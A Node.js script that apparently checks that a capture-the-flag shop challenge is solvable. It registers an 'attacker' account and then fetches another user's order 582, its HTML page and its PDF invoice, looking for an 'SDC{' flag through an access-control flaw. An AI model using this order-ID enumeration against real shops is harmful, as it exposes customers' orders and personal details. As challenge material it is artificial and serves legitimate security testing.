// remote verification against deployed worker URL passed as argv[2]
const BASE = process.argv[2] || "https://sahara-souq.sahara-souq.workers.dev";
const email = `attacker_${Date.now()}@example.com`;
let cookie = "";
function hdr() {
  return { "Content-Type": "application/json", ...(cookie ? { Cookie: cookie } : {}) };
}
async function main() {
  let r = await fetch(BASE + "/api/register", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ name: "Attacker", email, password: "Attacker123!" }),
  });
  console.log("register:", r.status);
  if (r.status !== 201) throw new Error(await r.text());
  cookie = (r.headers.get("set-cookie") || "").split(";")[0];
  r = await fetch(BASE + "/api/orders", {
    method: "POST",
    headers: hdr(),
    body: JSON.stringify({
      items: [{ product_id: 7, qty: 1 }],
      shipping_name: "Attacker",
      shipping_phone: "0550000111",
      shipping_city: "الرياض",
      shipping_address: "حي الياسمين",
      notes: "",
    }),
  });
  const created = await r.json();
  console.log("checkout:", r.status, JSON.stringify(created));
  const rNo = await fetch(BASE + "/api/orders/582");
  console.log("no-auth 582:", rNo.status, "(expect 401)");
  r = await fetch(BASE + "/api/orders/581", { headers: hdr() });
  const b581 = await r.text();
  console.log("581:", r.status, "has-flag=" + b581.includes("SDC{"));
  r = await fetch(BASE + "/api/orders/582", { headers: hdr() });
  const b582 = await r.text();
  console.log("582:", r.status, "has-flag=" + b582.includes("SDC{"));
  r = await fetch(BASE + "/orders/582", { headers: { Cookie: cookie } });
  console.log("html 582:", r.status, "has-flag=" + (await r.text()).includes("SDC{"));
  r = await fetch(BASE + "/orders/582/invoice", { headers: { Cookie: cookie } });
  const buf = Buffer.from(await r.arrayBuffer());
  console.log("invoice:", r.status, r.headers.get("content-type"), "pdf=" + buf.slice(0, 5).toString(), "has-flag=" + buf.includes("SDC{"));
  console.log(b582.includes("SDC{") ? "REMOTE PASS" : "REMOTE FAIL");
  if (!b582.includes("SDC{")) process.exit(1);
}
main().catch((e) => {
  console.error("REMOTE FAIL:", e.message);
  process.exit(1);
});
